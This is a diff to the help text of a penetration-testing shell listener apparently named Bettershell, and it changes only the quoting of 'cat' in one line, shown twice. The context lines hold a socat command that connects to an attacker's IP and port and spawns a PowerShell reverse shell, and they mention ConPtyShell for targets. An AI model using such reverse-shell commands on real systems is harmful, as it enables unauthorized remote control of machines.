@@ -10,7 +10,7 @@ if [[ $# -eq 0 ]] ; then
     echo "  - Bettershell uses ordinary netcat options like '-nlvp 4444'"
     echo "  - For stderr, use included socat.exe: \"socat.exe tcp-connect:\$IP:\$PORT exec:powershell.exe,pty,stderr\""
     echo "  - If your target is running Windows 10, consider using ConPtyShell instead for true remote Powershell API."
-    echo "  - Since tab completion works by reading server responses, 'cat'-ing huge text files should be avoided for best results."
+    echo "  - Since tab completion works by reading server responses, cat-ing huge text files should be avoided for best results."
     echo "  - Use CTRL+R to search command history."
     exit 0
 fi
@@ -21,7 +21,7 @@ then
     echo "  - Bettershell uses ordinary netcat options like '-nlvp 4444'"
     echo "  - For stderr, use included socat.exe: \"socat.exe tcp-connect:\$IP:\$PORT exec:powershell.exe,pty,stderr\""
     echo "  - If your target is running Windows 10, consider using ConPtyShell instead for true remote Powershell API."
-    echo "  - Since tab completion works by reading server responses, 'cat'-ing huge text files should be avoided for best results."
+    echo "  - Since tab completion works by reading server responses, cat-ing huge text files should be avoided for best results."
     echo "  - Use CTRL+R to search command history."
 else
     echo ""
